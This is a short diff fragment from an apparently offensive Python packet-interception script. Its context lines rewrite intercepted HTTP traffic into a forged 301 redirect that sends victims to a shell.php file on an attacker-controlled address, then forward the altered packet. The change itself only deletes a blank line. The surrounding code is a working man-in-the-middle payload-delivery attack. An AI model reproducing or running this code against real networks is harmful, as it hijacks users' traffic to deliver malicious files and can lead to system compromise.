@@ -46,7 +46,6 @@ def process_packet(packet):
                 http_redirect = "HTTP/1.1 301 Moved Permanently\nLocation: http://10.222.111.228/evil_shit/shell.php\n\n"
                 modified_packet = set_load(scapy_packet, http_redirect)
                 packet.set_payload(str(modified_packet))
-
     packet.accept()  # Forwards packets
     # packet.drop()  # Drops packets
 
